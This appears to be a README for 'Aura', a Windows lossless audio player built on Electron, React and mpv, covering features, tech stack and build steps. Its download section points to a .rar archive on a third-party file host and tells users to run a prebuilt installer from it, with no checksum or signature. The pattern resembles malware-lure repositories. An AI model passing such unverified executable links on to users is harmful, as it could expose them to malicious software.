<div align="center">

# Aura

**A fast, bit-perfect lossless audio player for Windows.**

Built with Electron + React and powered by a bundled mpv engine.

![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=flat-square&logo=windows)
![Electron](https://img.shields.io/badge/Electron-44-2B2E3A?style=flat-square&logo=electron)
![React](https://img.shields.io/badge/React-19-149ECA?style=flat-square&logo=react)
![TypeScript](https://img.shields.io/badge/TypeScript-7-3178C6?style=flat-square&logo=typescript)
![Vite](https://img.shields.io/badge/Vite-8-646CFF?style=flat-square&logo=vite)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)

[![Download](https://img.shields.io/badge/Download-Aura%20(.rar)-2ea44f?style=for-the-badge&logo=github)](https://gofile.io/d/qBSJtsmV)

</div>

---

Aura pairs a buttery-smooth React interface with the battle-tested **mpv** engine, driving output through **WASAPI exclusive mode** and supporting optional **Dolby / DTS bitstream passthrough** to an AV receiver.

> Built for people who care about the signal path: no resampling, no loudness tampering, just the original bits.

## Download

**[Download Aura (.rar) →](https://gofile.io/d/qBSJtsmV)**

The archive contains the project source and the built application. The Windows installer lives inside the **`release/`** folder:

```
release/Aura-Setup-1.0.0.exe
```

## Installation (Windows)

1. Download the `.rar` archive from the link above.
2. Extract it (using WinRAR, 7-Zip, or PeaZip).
3. Open the extracted `aura-player` folder, then open the **`release`** folder.
4. Run **`Aura-Setup-1.0.0.exe`**.
5. Follow the installer prompts (choose the install location and shortcut options).
6. Launch **Aura** from the Start Menu or the desktop shortcut.

> Prefer a portable build? The same `release/` folder contains `win-unpacked/Aura.exe`, which runs without installing.

## Table of Contents

- [Download](#download)
- [Installation (Windows)](#installation-windows)
- [Features](#features)
  - [Bit-perfect audio engine](#bit-perfect-audio-engine)
  - [Broad format support](#broad-format-support)
  - [Music library](#music-library)
  - [Views](#views)
  - [Playback & queue](#playback--queue)
  - [Polished UI/UX](#polished-uiux)
  - [Keyboard shortcuts](#keyboard-shortcuts)
- [Screenshots](#screenshots)
- [Tech stack](#tech-stack)
- [Getting started](#getting-started)
- [Project structure](#project-structure)
- [Status](#status)
- [License](#license)
- [Acknowledgements](#acknowledgements)

## Features

### Bit-perfect audio engine
- **WASAPI exclusive mode** for an unsampled, bit-perfect output path (toggleable in Settings).
- **Gapless playback** so albums flow seamlessly between tracks.
- **Dolby / DTS bitstream passthrough** — send the untouched bitstream to a receiver or soundbar over HDMI / S/PDIF:
  - Dolby Digital (AC-3)
  - Dolby Digital Plus (E-AC-3)
  - DTS
  - DTS-HD / DTS:X
  - Dolby TrueHD / Atmos
- **ReplayGain off by default** to preserve the original signal.
- Live **audio telemetry**: codec, sample rate, bit depth, channel layout, and lossless/passthrough/Dolby badges.
- **Output device picker** — enumerate and select any WASAPI device, or follow the system default.

### Broad format support
- **Lossless:** FLAC, ALAC, WAV, AIFF, APE, WavPack, TTA, TAK, and more.
- **Hi-Res & DSD:** DSF, DFF, high-bit-depth PCM.
- **Surround:** AC-3, E-AC-3, DTS, DTS-HD, TrueHD, MLP.
- **Compressed:** MP3, AAC/M4A, OGG, Opus, WMA.
- Full container coverage: `m4a`, `m4b`, `mka`, `wv`, `mpc`, `caf`, `au`, and others.

### Music library
- Add one or more **music folders**; Aura scans them recursively and caches the results.
- Fast metadata parsing via **music-metadata** (title, artist, album artist, album, year, genre, track/disc numbers, duration, codec, sample rate, bit depth, channels).
- **Embedded cover art** extracted and cached on disk, served through a custom `aura-cover://` protocol.
- **Live scan progress** with a per-phase indicator in the sidebar.
- **Drag & drop** files or entire folders onto the window — folders are added to the library, loose files are queued to play.

### Views
- **Library** — virtualized track list with sortable columns (title / album), instant search, format and lossless badges.
- **Albums** — grouped by album + album artist, with detailed album pages, Play and Shuffle actions.
- **Artists** — grouped by artist (falling back to album artist) with track/album counts and artist pages.
- **Now Playing** — full-screen immersive view with large artwork, track metadata, seek bar, transport controls, and volume.
- **Settings** — audio output, passthrough, appearance, and music folder management.

### Playback & queue
- Play / pause, previous / next, seek (click or drag), volume, and mute.
- **Shuffle** and **Repeat** (off / all / one).
- A slide-in **play queue** panel: jump to any track, remove individual items, or clear the queue.
- Smart defaults: clicking play from Artists or the Library loads the surrounding list as the queue.

### Polished UI/UX
- **Frameless custom window** with a native-feeling custom title bar (minimize / maximize / close), single-instance enforcement.
- **Animated aurora background** that shifts with the current track and adapts to its cover art.
- **Five accent themes** (violet, cyan, emerald, rose, amber) applied live across the app.
- **Animated equalizer-style visualizer** bars while playing.
- Smooth view transitions and spring interactions throughout (Framer Motion).
- **Keyboard shortcuts** for fast, mouse-free control.

### Keyboard shortcuts
| Keys | Action |
| --- | --- |
| `Space` | Play / pause |
| `←` / `→` | Seek back / forward 5s |
| `Shift` + `←` / `→` | Previous / next track |
| `↑` / `↓` | Volume up / down |
| `M` | Mute / unmute |
| `Q` | Toggle the play queue |
| `Esc` | Close queue / collapse Now Playing |

## Screenshots
<img width="1917" height="1078" alt="Screenshot 2026-10-09 142036" src="https://github.com/user-attachments/assets/f5ce0040-e5c0-4212-b86a-1b1b1d05b623" />
<img width="1917" height="1078" alt="Screenshot 2026-10-09 141950" src="https://github.com/user-attachments/assets/0e3293b9-afce-433a-bcc4-ae216f952cc7" />
<img width="1917" height="1078" alt="Screenshot 2026-10-09 142236" src="https://github.com/user-attachments/assets/1eb7b9bd-1bfc-4bd1-98fc-ace0b67e09b1" />
<img width="1917" height="1078" alt="Screenshot 2026-10-09 142205" src="https://github.com/user-attachments/assets/a131a0d1-cb68-400b-82fa-baf9da130c01" />
<img width="1917" height="1078" alt="Screenshot 2026-10-09 142139" src="https://github.com/user-attachments/assets/d22448c4-92b7-4cac-ac3d-ca90190c6b48" />
<img width="1137" height="531" alt="Screenshot 2026-10-09 142411" src="https://github.com/user-attachments/assets/688ac5a6-cdac-413b-bcd6-f5c68c8c6f0f" />
<img width="1177" height="567" alt="Screenshot 2026-10-09 142355" src="https://github.com/user-attachments/assets/11f46654-7e9c-4616-9944-6fb5df2f86ed" />




<div align="center">


</div>

## Tech stack

| Layer | Technology |
| --- | --- |
| Shell | Electron 44 |
| UI | React 19 + TypeScript 7 |
| Build | Vite 8 (Rolldown) |
| Styling | Tailwind CSS v4 |
| Motion | Framer Motion |
| Icons | lucide-react |
| Audio engine | **mpv** (bundled, driven over JSON IPC) |
| Metadata | music-metadata |
| Packaging | electron-builder (NSIS installer) |

### How it works
- The **main process** spawns a bundled `mpv.exe` and controls it over a **JSON IPC named pipe** (`\\.\pipe\aura-mpv-...`). Audio output, exclusive mode, and passthrough are all configured through mpv.
- A **preload script** exposes a safe `window.aura` bridge (context isolation on, node integration off).
- The **renderer** is a React SPA that receives a single normalized player-state stream and renders the library, views, and controls.
- Cover art is served through a privileged `aura-cover://` protocol backed by the on-disk cover cache.

## Getting started

### Requirements
- **Windows 10 / 11 (x64)** — WASAPI exclusive mode and the bundled mpv build are Windows-specific.
- **Node.js 20+** and npm.
- A copy of **mpv** at `resources/mpv/mpv.exe` (bundled in release builds). The upstream mpv binary is not committed here to keep the repository small — download a Windows build and place `mpv.exe` in `resources/mpv/`.

### Install
```bash
npm install
```

### Development (hot-reloading UI + Electron)
```bash
npm run dev
```

### Run the production build locally
```bash
npm run build:web
npm start
```

### Type check
```bash
npm run typecheck
```

### Build the Windows installer
```bash
npm run dist
```
Produces an NSIS installer at `release/Aura-Setup-<version>.exe`, plus an unpacked app in `release/win-unpacked/`.

### Regenerate app icons
```bash
npm run icon
```

## Project structure
```
aura-player/
├─ electron/            # main process
│  ├─ main.js           # app entry, window, IPC, protocol
│  ├─ mpv.js            # mpv controller (JSON IPC, device listing, passthrough)
│  ├─ player.js         # queue + player state machine
│  ├─ library.js        # folder scanning, metadata, cover caching
│  ├─ settings.js       # persisted settings
│  └─ preload.js        # window.aura bridge
├─ src/                 # React renderer
│  ├─ components/       # Cover, PlayerBar, QueuePanel, Sidebar, Visualizer, ...
│  │  └─ views/         # Library, Albums, Artists, NowPlaying, Settings
│  ├─ lib/              # types, api bridge, store, formatting, grouping
│  └─ styles.css        # Tailwind v4 theme
├─ resources/mpv/       # bundled mpv.exe
├─ scripts/             # icon generator, engine smoke test
├─ electron-builder.yml # packaging config
└─ index.html
```

## Status

Aura is under active development. The Windows build and NSIS installer are functional today; the visualizer is currently a lightweight animated indicator rather than real-time spectrum analysis.

## License

[MIT](LICENSE)

## Acknowledgements

- [mpv](https://mpv.io/) — the playback engine
- [music-metadata](https://github.com/Borewit/music-metadata) — audio metadata parsing
- [Electron](https://www.electronjs.org/), [React](https://react.dev/), [Vite](https://vite.dev/), [Tailwind CSS](https://tailwindcss.com/), [Framer Motion](https://www.framer.com/motion/), [lucide](https://lucide.dev/)
